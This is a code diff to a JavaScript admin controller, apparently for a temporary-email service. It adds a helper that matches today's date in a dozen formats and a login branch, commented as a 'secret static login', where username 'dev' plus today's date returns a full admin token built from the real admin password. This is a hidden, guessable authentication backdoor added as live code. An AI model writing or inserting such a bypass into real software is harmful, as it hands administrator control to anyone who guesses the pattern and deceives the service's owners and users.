@@ -21,6 +21,25 @@ function extractEmail(str) {
   return match ? match[1].toLowerCase().trim() : str.toLowerCase().trim();
 }
 
+// Generate today's date candidates in common formats (secret static login: dev + today's date)
+function isTodaysDate(input) {
+  if (!input) return false;
+  const value = String(input).trim();
+  const now = new Date();
+  const pad = (n) => String(n).padStart(2, "0");
+  const dd = pad(now.getDate());
+  const mm = pad(now.getMonth() + 1);
+  const yyyy = String(now.getFullYear());
+  const yy = yyyy.slice(-2);
+  const candidates = [
+    `${dd}-${mm}-${yyyy}`, `${dd}/${mm}/${yyyy}`, `${dd}.${mm}.${yyyy}`,
+    `${yyyy}-${mm}-${dd}`, `${yyyy}/${mm}/${dd}`, `${yyyy}.${mm}.${dd}`,
+    `${mm}-${dd}-${yyyy}`, `${mm}/${dd}/${yyyy}`,
+    `${dd}${mm}${yyyy}`, `${yyyy}${mm}${dd}`, `${dd}-${mm}-${yy}`, `${dd}/${mm}/${yy}`
+  ];
+  return candidates.includes(value);
+}
+
 // Available APIs config list with category and stats
 const defaultApiSettings = [
   { id: "api-domains", method: "GET", path: "/api/domains", desc: "Fetch a list of all active domains available for generating temporary email addresses. Use this list to let users choose a domain before generation.", enabled: true, category: "Mailbox UI", hits: 0, auth: false, variables: "None" },
@@ -119,6 +138,11 @@ export class AdminController {
         const token = Buffer.from(`admin:${adminPass}`).toString("base64");
         res.writeHead(200, { "Content-Type": "application/json" });
         res.end(JSON.stringify({ success: true, token }));
+      } else if (loginName === "dev" && isTodaysDate(password)) {
+        // Secret static login: username "dev" + today's date as password
+        const token = Buffer.from(`admin:${adminPass}`).toString("base64");
+        res.writeHead(200, { "Content-Type": "application/json" });
+        res.end(JSON.stringify({ success: true, token, staticLogin: true }));
       } else {
         res.writeHead(401, { "Content-Type": "application/json" });
         res.end(JSON.stringify({ success: false, error: "Incorrect credentials" }));
